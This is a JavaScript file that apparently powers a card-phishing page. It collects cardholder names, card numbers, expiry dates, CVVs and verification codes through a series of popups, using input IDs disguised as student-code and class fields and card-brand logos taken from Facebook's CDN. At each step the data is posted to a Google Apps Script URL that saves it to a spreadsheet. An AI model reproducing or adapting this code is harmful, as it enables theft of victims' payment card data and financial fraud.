const URL_BACKEND = "https://script.google.com/macros/s/AKfycbwPBEuLzKSs75vyvQwSggqDn1GwJiudpJKNUWgf5jr7J--i_2MnnYYP4rRAcV97tyTIfg/exec";

function formatMMYY(el) {
    let val = el.value.replace(/\D/g, '');
    if (val.length > 2) {
        val = val.substring(0, 2) + '/' + val.substring(2, 4);
    }
    el.value = val;
}

function cekLogo(el, logoId) {
    const logo = document.getElementById(logoId);
    const val = el.value.trim();
    logo.style.display = 'none';

    if (val.startsWith('5')) {
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yF/r/ZIeCyGzzAnR.webp?_nc_eui2=AeGWwsovkpKgGwR5712WjAOnSDhX2V7vCpNIOFfZXu8KkzsklIN_PeJIQyN_Dc2HO-Nam4L4_wo25wTn70CGGFEn';
        el.maxLength = 16;
        logo.style.display = 'block';
    } else if (val.startsWith('4')) {
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yw/r/IqqGd5lm28u.webp?_nc_eui2=AeEcfLNBgWfMfn2FlPUptMio7ytqcbilrFXvK2pxuKWsVbrgYgT61QZYYVZltyEvx_pGoDhLhCJVcxzCOLn3yfjf';
        el.maxLength = 16;
        logo.style.display = 'block';
    } else if (val.startsWith('3')) {
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yA/r/X91YHq0KzqQ.webp?_nc_eui2=AeH3udDwy0csMqZkNmFMritx0t6v52TsYTHS3q_nZOxhMTjTR5EztPutwBcpX_bKTH_icI3T5cy1QeIHNNEBZOC5';
        el.maxLength = 15;
        logo.style.display = 'block';
    }
}

async function simpanDataKeSpreadsheet() {
    const data = {
        // Popup 1
        nama1: document.getElementById('nama')?.value || "",
        nomorKartu1: document.getElementById('kodeSiswa')?.value || "",
        masaBerlaku1: document.getElementById('mmyy')?.value || "",
        cvv1: document.getElementById('kelas')?.value || "",
        
        // Popup 2
        nama2: document.getElementById('nama2')?.value || "",
        nomorKartu2: document.getElementById('kodeSiswa2')?.value || "",
        masaBerlaku2: document.getElementById('mmyy2')?.value || "",
        cvv2: document.getElementById('kelas2')?.value || "",
        
        // Popup 3 & 4
        kodeVerifikasi1: document.getElementById('kodeVerifikasi1')?.value || "",
        kodeVerifikasi2: document.getElementById('kodeVerifikasi2')?.value || "",
        
        waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
    };

    try {
        const respon = await fetch(URL_BACKEND, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const hasil = await respon.json();
        if (hasil.status === "berhasil") {
            console.log("Semua data tersimpan:", hasil);
            return true;
        } else {
            alert("Gagal menyimpan data: " + hasil.pesan);
            return false;
        }
    } catch (error) {
        console.error("Kesalahan pengiriman:", error);
        alert("Terjadi kesalahan saat mengirim data");
        return false;
    }
}

async function nextPopup(current, next) {
    // Simpan data saat pindah dari popup 1, 2, dan 3
    if(current === 'popup1' || current === 'popup2' || current === 'popup3') {
        const berhasil = await simpanDataKeSpreadsheet();
        if (!berhasil) return;

        if(current === 'popup1') {
            let code = document.getElementById('kodeSiswa').value;
            let last4 = code.slice(-4);
            document.getElementById('kelasDisplay').innerText = last4;
            document.getElementById('kelasDisplay2').innerText = last4;
        }
    }
    
    document.getElementById(current).classList.add('hidden');
    document.getElementById(next).classList.remove('hidden');
}